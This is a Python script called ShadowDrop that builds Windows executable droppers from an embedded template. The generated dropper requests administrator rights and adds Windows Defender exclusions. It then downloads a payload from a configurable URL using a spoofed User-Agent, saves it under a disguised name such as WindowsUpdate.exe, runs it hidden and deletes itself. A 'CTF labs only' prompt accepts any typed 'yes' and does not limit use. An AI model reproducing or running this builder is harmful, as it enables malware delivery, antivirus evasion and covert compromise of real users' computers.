#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
  ShadowDrop - Security Edition
============================================================
  Developer : ATHEX BLACK HAT
  Version   : 1.0.0
  Purpose   : Generate customized .exe droppers for CTF labs
  Platform  : Builder (cross-platform) | Target (Windows)
============================================================
"""

import os
import sys
import shutil
import subprocess
import tempfile
from datetime import datetime


# ============================================================
# CONFIGURATION
# ============================================================
DEVELOPER = "ATHEX BLACK HAT"
VERSION = "1.0.0"
PROJECT = "ShadowDrop"


# ============================================================
# ANSI COLORS
# ============================================================
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"


def enable_ansi_windows():
    """Enable ANSI colors on Windows CMD."""
    if os.name == 'nt':
        try:
            os.system('')
        except Exception:
            pass


# ============================================================
# ASCII BANNER
# ============================================================
BANNER = r"""
███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗      ██████╗ ██████╗  ██████╗ ██████╗ 
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║      ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║█████╗██║  ██║██████╔╝██║   ██║██████╔╝
╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║╚════╝██║  ██║██╔══██╗██║   ██║██╔═══╝ 
███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝      ██████╔╝██║  ██║╚██████╔╝██║     
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                                                  DEVELOPED BY ATHEX BLACK HAT                       
"""

SUBTITLE = r"""
              D R O P P E R   B U I L D E R                  
              Security Edition  ·  v1.0.0                     
"""


def print_banner():
    """Print styled banner."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(C.CYAN + C.BOLD + BANNER + C.RESET)
    print(C.MAGENTA + SUBTITLE + C.RESET)
    print(f"  {C.DIM}Developer :{C.RESET} {C.GREEN}{C.BOLD}{DEVELOPER}{C.RESET}")
    print(f"  {C.DIM}Version   :{C.RESET} {C.GREEN}{VERSION}{C.RESET}")
    print(f"  {C.DIM}Project   :{C.RESET} {C.GREEN}{PROJECT}{C.RESET}")
    print(f"  {C.DIM}Timestamp :{C.RESET} {C.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}")
    print()


# ============================================================
# DROPPER TEMPLATE
# ============================================================
DROPPER_TEMPLATE = '''import os
import sys
import urllib.request
import subprocess
import ctypes
import time
import random

EXE_URL = "{EXE_URL}"
EXEC_FOLDER = os.path.expandvars(r"{EXEC_FOLDER}")
FINAL_NAME = "{FINAL_NAME}"


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def add_exclusion(folder_path):
    """Add Defender exclusion for the folder."""
    os.makedirs(folder_path, exist_ok=True)

    cmd1 = ["powershell", "-Command",
            f"Add-MpPreference -ExclusionPath '{{folder_path}}' -Force"]
    subprocess.run(cmd1, capture_output=True)

    cmd2 = ["powershell", "-Command",
            "Set-MpPreference -ExclusionExtension 'exe' -Force"]
    subprocess.run(cmd2, capture_output=True)


def download_exe(url, dest_path):
    """Download EXE with fake User-Agent."""
    req = urllib.request.Request(url, headers={{
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36'
    }})
    with urllib.request.urlopen(req, timeout=30) as r:
        data = r.read()
    with open(dest_path, 'wb') as f:
        f.write(data)
    return data


def run_hidden(exe_path):
    """Launch EXE with zero visible windows."""
    startup_info = subprocess.STARTUPINFO()
    startup_info.dwFlags = subprocess.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = 0  # SW_HIDE

    creation_flags = 0x08000000  # CREATE_NO_WINDOW

    proc = subprocess.Popen(
        exe_path,
        shell=False,
        startupinfo=startup_info,
        creationflags=creation_flags,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE
    )

    if proc.stdout:
        proc.stdout.close()
    if proc.stderr:
        proc.stderr.close()
    if proc.stdin:
        proc.stdin.close()

    return proc


def main():
    if not is_admin():
        params = " ".join(f'"{{a}}"' for a in sys.argv)
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, params, None, 1
        )
        sys.exit()

    add_exclusion(EXEC_FOLDER)
    time.sleep(1)

    exe_path = os.path.join(EXEC_FOLDER, FINAL_NAME)

    try:
        download_exe(EXE_URL, exe_path)
    except Exception:
        temp_path = os.path.join(
            os.environ.get('TEMP', '.'), f'upd{{random.randint(1000, 9999)}}.exe'
        )
        download_exe(EXE_URL, temp_path)
        os.replace(temp_path, exe_path)

    time.sleep(random.uniform(0.5, 2.0))

    run_hidden(exe_path)

    try:
        if getattr(sys, 'frozen', False):
            bat_content = (
                "@echo off\\n"
                "timeout /t 3 /nobreak >nul\\n"
                f'del "{{sys.executable}}"\\n'
                'del "%~f0"\\n'
            )
            del_path = os.path.join(os.environ.get('TEMP', '.'), 'cleanup.bat')
            with open(del_path, 'w') as f:
                f.write(bat_content)
            si = subprocess.STARTUPINFO()
            si.dwFlags = subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            subprocess.Popen(
                del_path,
                shell=True,
                startupinfo=si,
                creationflags=0x08000000
            )
    except Exception:
        pass


if __name__ == "__main__":
    main()
'''


# ============================================================
# INPUT HELPERS
# ============================================================
def get_input(prompt, default=None, required=True):
    """Get user input with optional default."""
    if default:
        display = f"{C.CYAN}{prompt}{C.RESET} {C.DIM}[{default}]{C.RESET}: "
    else:
        display = f"{C.CYAN}{prompt}{C.RESET}: "

    try:
        value = input(display).strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n{C.RED}[!] Cancelled by user.{C.RESET}")
        sys.exit(1)

    if not value:
        if default is not None:
            return default
        if required:
            print(f"{C.RED}[-] This field is required.{C.RESET}")
            return get_input(prompt, default, required)
    return value


def get_yes_no(prompt, default="n"):
    """Yes/No input."""
    display = f"{C.CYAN}{prompt}{C.RESET} {C.DIM}(y/n) [{default}]{C.RESET}: "
    try:
        value = input(display).strip().lower()
    except (KeyboardInterrupt, EOFError):
        print(f"\n{C.RED}[!] Cancelled by user.{C.RESET}")
        sys.exit(1)
    if not value:
        value = default
    return value == 'y'


# ============================================================
# CONFIG COLLECTION
# ============================================================
def collect_config():
    """Interactively collect build config."""
    print(f"{C.YELLOW}{C.BOLD}[*] PAYLOAD SETTINGS{C.RESET}")
    print(f"{C.DIM}{'-' * 55}{C.RESET}")

    exe_url = get_input("  Payload URL (e.g., http://localhost:8080/payload.exe)")
    final_name = get_input("  Final filename on target", default="WindowsUpdate.exe")
    exec_folder = get_input(
        "  Execution folder",
        default=r"%ProgramData%\Microsoft\Windows\Caches"
    )

    print()
    print(f"{C.YELLOW}{C.BOLD}[*] OUTPUT SETTINGS{C.RESET}")
    print(f"{C.DIM}{'-' * 55}{C.RESET}")

    default_name = f"dropper_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    output_name = get_input("  Output .exe name (without .exe)", default=default_name)

    print()
    print(f"{C.YELLOW}{C.BOLD}[*] BUILD OPTIONS{C.RESET}")
    print(f"{C.DIM}{'-' * 55}{C.RESET}")

    icon_path = get_input("  Icon path (.ico, blank for none)", default="", required=False)
    use_upx = get_yes_no("  Compress with UPX", default="n")

    return {
        "EXE_URL": exe_url,
        "FINAL_NAME": final_name,
        "EXEC_FOLDER": exec_folder,
        "OUTPUT_NAME": output_name,
        "ICON": icon_path,
        "UPX": use_upx,
    }


# ============================================================
# CONFIG REVIEW
# ============================================================
def review_config(config):
    """Show config summary before build."""
    print()
    print(f"{C.MAGENTA}{C.BOLD}┌{'─' * 57}┐{C.RESET}")
    print(f"{C.MAGENTA}{C.BOLD}│{C.RESET}  {C.BOLD}CONFIGURATION SUMMARY{C.RESET}"
          f"{' ' * 33}{C.MAGENTA}{C.BOLD}│{C.RESET}")
    print(f"{C.MAGENTA}{C.BOLD}├{'─' * 57}┤{C.RESET}")

    rows = [
        ("Payload URL", config["EXE_URL"]),
        ("Target Name", config["FINAL_NAME"]),
        ("Target Folder", config["EXEC_FOLDER"]),
        ("Output Name", config["OUTPUT_NAME"] + ".exe"),
        ("Icon", config["ICON"] if config["ICON"] else "(none)"),
        ("UPX Compress", "YES" if config["UPX"] else "NO"),
    ]

    for label, value in rows:
        val_display = value if len(str(value)) <= 36 else "..." + str(value)[-33:]
        print(f"{C.MAGENTA}{C.BOLD}│{C.RESET}  {C.DIM}{label:<14}{C.RESET} "
              f"{C.GREEN}{val_display:<40}{C.RESET}{C.MAGENTA}{C.BOLD}│{C.RESET}")

    print(f"{C.MAGENTA}{C.BOLD}└{'─' * 57}┘{C.RESET}")
    print()


# ============================================================
# PYINSTALLER CHECK
# ============================================================
def check_pyinstaller():
    """Verify PyInstaller is installed."""
    try:
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--version"],
            capture_output=True,
            text=True,
            timeout=30
        )
        if result.returncode == 0:
            return result.stdout.strip()
        return None
    except Exception:
        return None


# ============================================================
# SOURCE GENERATION
# ============================================================
def generate_source(config, temp_dir):
    """Generate .py source with injected config."""
    source = DROPPER_TEMPLATE.format(
        EXE_URL=config["EXE_URL"],
        EXEC_FOLDER=config["EXEC_FOLDER"],
        FINAL_NAME=config["FINAL_NAME"],
    )

    py_path = os.path.join(temp_dir, "dropper_source.py")
    with open(py_path, "w", encoding="utf-8") as f:
        f.write(source)

    return py_path


# ============================================================
# BUILD EXE
# ============================================================
def build_exe(py_path, config, temp_dir):
    """Compile .py to .exe using PyInstaller."""
    output_dir = os.path.abspath("output")
    os.makedirs(output_dir, exist_ok=True)

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--name", config["OUTPUT_NAME"],
        "--distpath", output_dir,
        "--workpath", os.path.join(temp_dir, "build"),
        "--specpath", temp_dir,
        "--clean",
        "--noconfirm",
    ]

    if config["ICON"]:
        icon_abs = os.path.abspath(config["ICON"])
        if os.path.exists(icon_abs):
            cmd.extend(["--icon", icon_abs])
        else:
            print(f"{C.YELLOW}[!] Icon not found, skipping: {config['ICON']}{C.RESET}")

    if config["UPX"]:
        cmd.append("--upx-dir")
        cmd.append(temp_dir)

    cmd.append(py_path)

    print(f"{C.DIM}$ {' '.join(cmd)}{C.RESET}")
    print()

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600
        )
    except subprocess.TimeoutExpired:
        print(f"{C.RED}[-] PyInstaller timed out (10 min).{C.RESET}")
        return None

    if result.returncode != 0:
        print(f"{C.RED}[-] PyInstaller failed!{C.RESET}")
        print(f"{C.DIM}{result.stderr[-2000:]}{C.RESET}")
        return None

    exe_path = os.path.join(output_dir, f"{config['OUTPUT_NAME']}.exe")

    if os.path.exists(exe_path):
        return exe_path

    print(f"{C.RED}[-] Expected output not found: {exe_path}{C.RESET}")
    return None


# ============================================================
# CLEANUP
# ============================================================
def cleanup_temp(temp_dir):
    """Safely remove temp build directory."""
    try:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
    except Exception:
        pass


# ============================================================
# MAIN
# ============================================================
def main():
    enable_ansi_windows()
    print_banner()

    # Authorization gate
    print(f"{C.BG_RED}{C.WHITE}{C.BOLD}  ⚠  AUTHORIZATION REQUIRED  {C.RESET}")
    print(f"{C.YELLOW}This tool is for authorized CTF labs only.{C.RESET}")
    print()

    confirm = get_input("Type 'yes' to confirm authorization", required=True).lower()
    if confirm != "yes":
        print(f"\n{C.RED}[-] Authorization not confirmed. Exiting.{C.RESET}")
        sys.exit(1)

    print(f"{C.GREEN}[+] Authorization confirmed.{C.RESET}\n")

    # PyInstaller check
    print(f"{C.CYAN}[*] Checking PyInstaller...{C.RESET}")
    pyi_ver = check_pyinstaller()
    if not pyi_ver:
        print(f"{C.RED}[-] PyInstaller not installed!{C.RESET}")
        print(f"{C.YELLOW}[*] Install: pip install pyinstaller{C.RESET}")
        sys.exit(1)
    print(f"{C.GREEN}[+] PyInstaller found: v{pyi_ver}{C.RESET}\n")

    # Collect config
    config = collect_config()
    review_config(config)

    proceed = get_yes_no("Proceed with build?", default="y")
    if not proceed:
        print(f"{C.YELLOW}[!] Build cancelled.{C.RESET}")
        sys.exit(0)

    # Build
    print(f"\n{C.CYAN}{C.BOLD}[*] Starting build...{C.RESET}\n")

    temp_dir = tempfile.mkdtemp(prefix="dropper_build_")

    try:
        # Step 1
        print(f"{C.BLUE}[1/3]{C.RESET} {C.BOLD}Generating source code...{C.RESET}")
        py_path = generate_source(config, temp_dir)
        size_src = os.path.getsize(py_path)
        print(f"{C.GREEN}      ✓ Source generated ({size_src} bytes){C.RESET}\n")

        # Step 2
        print(f"{C.BLUE}[2/3]{C.RESET} {C.BOLD}Compiling to .exe...{C.RESET}")
        print(f"{C.DIM}      This may take 30-90 seconds...{C.RESET}\n")
        exe_path = build_exe(py_path, config, temp_dir)

        if not exe_path:
            print(f"\n{C.RED}[-] Build failed.{C.RESET}")
            sys.exit(1)

        # Step 3
        print(f"{C.BLUE}[3/3]{C.RESET} {C.BOLD}Finalizing...{C.RESET}")
        size_kb = os.path.getsize(exe_path) / 1024
        print(f"{C.GREEN}      ✓ Build complete{C.RESET}\n")

        # Success panel
        print(f"{C.BG_GREEN}{C.WHITE}{C.BOLD}  ✅  BUILD SUCCESSFUL  {C.RESET}\n")
        print(f"  {C.DIM}├─{C.RESET} {C.BOLD}Output   :{C.RESET} {C.GREEN}{exe_path}{C.RESET}")
        print(f"  {C.DIM}├─{C.RESET} {C.BOLD}Size     :{C.RESET} {C.GREEN}{size_kb:.2f} KB{C.RESET}")
        print(f"  {C.DIM}├─{C.RESET} {C.BOLD}Target   :{C.RESET} {C.CYAN}{config['EXE_URL']}{C.RESET}")
        print(f"  {C.DIM}├─{C.RESET} {C.BOLD}Folder   :{C.RESET} {C.CYAN}{config['EXEC_FOLDER']}{C.RESET}")
        print(f"  {C.DIM}└─{C.RESET} {C.BOLD}Name     :{C.RESET} {C.CYAN}{config['FINAL_NAME']}{C.RESET}")
        print()
        print(f"  {C.YELLOW}🚀 Ready to deploy in CTF lab.{C.RESET}")
        print(f"  {C.DIM}Developer: {DEVELOPER}  ·  {PROJECT} v{VERSION}{C.RESET}\n")

    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Build interrupted by user.{C.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{C.RED}[-] Unexpected error: {e}{C.RESET}")
        sys.exit(1)
    finally:
        cleanup_temp(temp_dir)


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Exiting...{C.RESET}")
        sys.exit(0)